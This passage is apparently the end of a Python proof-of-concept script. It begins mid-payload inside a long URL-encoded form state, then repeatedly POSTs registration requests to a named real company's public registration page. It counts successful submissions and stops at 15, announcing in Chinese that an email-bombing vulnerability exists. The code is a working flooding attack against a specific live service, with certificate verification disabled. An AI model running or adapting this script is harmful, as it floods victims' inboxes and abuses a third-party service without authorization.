2BMD8D37BUnEr2X%2BwG8IFhOvVXwTPp3%2BVOhSWOEmlA061T1Cw6gyb5qH8imGxeSpJsJZr6rnVTUIJ5kBYuzhl2bnfeE5hmbEfVOkZuMYkMEKdlA3OHx6e5iwuNtdKLPkA%2Fi3C8zpfgRgyjZNUjwdLxO%2FLM9NfAkx0SRmPpfG7DaRBqtz1MV2yH4feBiEuIKwTtshYJYsc51%2BfFbFaaH03%2BOirtdDwldEIk5lg3OYKi4pyuO1NBxYOInyiKPoMh27tixB2Pq83nehnny20EIFFPCagHJBGBPve4J25oTP5XUCMyT%2BDCuu5bgtE3%2FZBCtNXlz0UtYco5%2F4GAJ57%2FMN59kEtvj0S2N%2FN1n77eB79QY0c1YG%2FwOJBBiHIcIvjJwoNAREofoiuPBiMj%2FjTaCbSnRBzGlTfx9OM4C1tR946PI1QrBHBg76RzZ8S%2Fcrzg49wEZzT%2BPKs6H%2BcMfiqknAah0TQMc%2Fw9QWSYOhcithXHVpAWwYI1X%2Fo1Ry%2B4klTJ1HqToVKQsKSEEXjZG8lHN%2BQB0reGmVzihIKbfdYdTSU22GqvBstW9Je24W0FEJcaqyVlUIJqlxE3jbikKV549Xn0Yk3tInJaAA%2B1%2Bza28lEVLTxrjiy%2FbxHN%2FZFfYgOgVyuWXR8gH%2FqTB20O6qi%2B%2BBqoGgz4acelFUl8xkMRaus1ypy6Nc6jkZ9EdqtG8O7macmWuwPZj06y%2BNxZlE4jg1yagJfWDym0kGK7iftODJmq1eCUpYNcMm%2BcV8aeZuJKAkzf44Zzz6A7bHsLuFW7P9jPRa1IpUYWfBWeZU4jiu5ytZ4VZ5Ysfy%2B7kH7SdZG%2BscyRjG7qNKDF3AfFHy6cUfjw3O7HgHH2Np4qIZu9IEgu8fiI5PCL7w1Gg3LLnt0XbyWlx8nqCsZIkHaepbasf8NyZjmSh1CsvjetSerOJJU0gW0M1hWqKtxIT94xCIkl01DwtTIYWNHA%2FgjufzrfN%2FpBAKz%2BZgDxb6kht%2BbHcG3y9iOW%2Fbi%2FTWgxzomjc0l4rXSsWNFFMv2bBe%2FZmuVXpvEJ1GK5EF8HDc4Md5nD1jbGRKSYyykjkefayBEDl7ZHz7BLssmrss7bm2ygVN3U2My6OTU0QtyJNd187aTB7f1pfScsSZKd33rvHsCWl0r0DBL2uio%2BAtunDMEkxRmE9%2B%2Bt14rume731aC6KRRO%2BSGJAurkvBAGCDBx5a7HIGtBxHygC0dAiq3IdUQAx%2BRbwnHN7yMcfKgHaHHERHYYJgNR4wy9mGH%2BQvEnw1GSaJ1zfq6LIRVtqPfQv5mfCipnZXvFtOQWntvIyTLD7n06iV4hgDsyGXvrJUS2jyBOOMe0mS%2B3SNSeL58Hayb%2FN9scefpXKwlWNLQeKPS7zqx1SZ2MH3miiZjKq0%2BWGfBz77rg32Xowu%2B%2B6gHGcD2Sw1nWYMpL5ZTC%2BKyhUtag85KRaVKagZiV5q9fUN1hIWbiGH1ON7z32bGrXbVEe45F94P81%2FCZv38KrdvtMUowegfY74ZSF3j77YxVIKQCLICDAJHRA52YuI1hT9X1P6ysrMWqiXbEJe%2FtZ6opaZEejzEnSeX4n9O%2FzxOtNTjW7eNqvJTABtiCGaGlobKFBNVqVqTJdLa7a5rubjYpGDV6npwptpOLA7Ky1dE%2FxGRHdQ0k74rX9quidwHAq55Z0WnbRdupBaR%2Fi2LowJz7ezFZegtz2pqQ188oHDua2%2BGWh2Iq1zg9%2FPmvcCbMO0AGZBeZJcb5drUiJHMOVIWVmhvNr%2BmY5%2FK3yKyyMVuXQvWSeBR5rmi3Z4qiQqLQKWTjzcp5Jv5YCwXogaZUIjR%2BmpdMSygXSrkaV5ZLKq1oc4vHiN8z5tnijzYHLMxi8K02n7pV7YvahpSM3QiL4EGH8Uzn8FO90CY2oD89HSVHC1NO0sQZwg73RgypvB33qOTOKbg5lBrWjZuoIJVXWlNCrWraVxBhwYg3xUyD5knv%2FJ7GAhfXvoyrH3as4qMPSJlE%2Bi8DZ7FU89wTwDKrcfGhs%2BVaettWHWnNXO6pZmF3xRJ%2FL%2Bukh2PUijQC0jP98O9%2BBZDVwYE9xhKexfHd72HqBlDhBd9gEm700YSo4D73MPC3WWZaCfQgQvBam1qB9i5YyE%2FOsYuRwJwzJbOSI99gVcnCl3bmX1dTX36KORd9tqRrHMF9rf2ynNcKasvvG5pghT0pYu%2BUJlyUOYPs%2F5NsnfZzGnPRfw1LOxegaSbmhCQFHQo0dNrnjIdwTAN%2FNEAubrjMM&jsf_viewid=%2Fregistration%2Fpub_register.jsp'
        url2 = "https://www.cargosmart.com/admin/registration/pub_register.jsf"
        r2 = requests.post(url=url2, data=sms_body, headers=headers2, timeout=5, verify=False)
        # print(r2.text)
        # break
        if 'Submitted' in r2.text:
            success_num = success_num + 1
            print('发送成功：累计发送：' + str(success_num))
        elif len(r2.text) > 500:
            print('发送失败：id重复！')
        else:
            print('发送失败：' + r2.text)
        if success_num >= 15:
            print("测试成功发送15条信息，存在邮件轰炸漏洞！")
            break
        time.sleep(1)


if __name__ == "__main__":
    do()
